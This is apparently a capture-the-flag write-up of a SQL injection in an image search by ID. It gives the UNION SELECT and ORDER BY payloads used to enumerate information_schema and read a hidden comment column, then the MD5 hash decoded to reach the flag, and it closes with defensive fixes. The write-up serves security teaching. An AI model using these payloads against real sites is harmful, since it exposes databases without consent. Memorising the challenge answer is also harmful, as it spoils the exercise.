# SQL Injection in Image Search

## Description

Image search asked to input an ID. \
By searching IDs manually (`1, 2, 3, 4, 5`), we discovered an image titled **"HackMe?"**. \
This was a hint that the search mechanism can be exploitable. \

With **SQL Injection**, we found that the schema contained a table named `list_images`, containing the columns:
- `id`
- `url`
- `title`
- `comment`

We remarked that `comment` was not displayed, so we attempted to display it.

## Steps to Reproduce

### Identify Table Structure

First, we need to find the correct number of columns in the database.

``` sql
1 ORDER BY 1 --
1 ORDER BY 2 --
1 ORDER BY 3 --
```
We assume that the database uses this syntax.

List the existing table columns:

```sql
5 AND 1=2 UNION SELECT table_name, column_name FROM information_schema.columns
```

We discovered the table `list_images` with the columns: `id`, `url`, `title`, and `comment`.

### Display Hidden `comment` Column

`comment` was not displayed by default, so we did a query to retrieve its content:

```sql
5 UNION ALL SELECT id, comment FROM list_images
```

The comment of id 5 contained a cryptographic challenge:
```
If you read this just use this md5 decode lowercase then sha256 to win this flag ! : `1928e8083cf461a51303633093573c46`
```

### Solve the Cryptographic Challenge

- **MD5 Decode** `1928e8083cf461a51303633093573c46` â†’ `albatroz`
- **SHA-256 Hash** of `albatroz` (flag):
```

```

## Danger
- **SQL Injection**: The search input is directly injected into the SQL query, allowing unauthorized access to the database structure and data.
- **Data Exposure**: Sensitive columns such as `comment` can be retrieved even if they are not meant to be displayed.
- **Potential for Full Database Dump**: An attacker could enumerate all tables, extract user credentials, or even modify the database.

## Recommended Fix

1. **Use Prepared Statements** (Parameterized Queries) to prevent direct SQL injection.

2. **Sanitize and Validate User Input**

Ensure that only **numeric values** are accepted when querying by ID.

3. **Limit Database Permissions**

Ensure the web application uses a **read-only** database user whenever possible.

4. **Hide Internal Database Structure**

Never expose database schema information through error messages or direct queries.

5. **Implement Web Application Firewalls (WAFs)**

Use **ModSecurity** or similar tools to detect and block SQL Injection attempts.
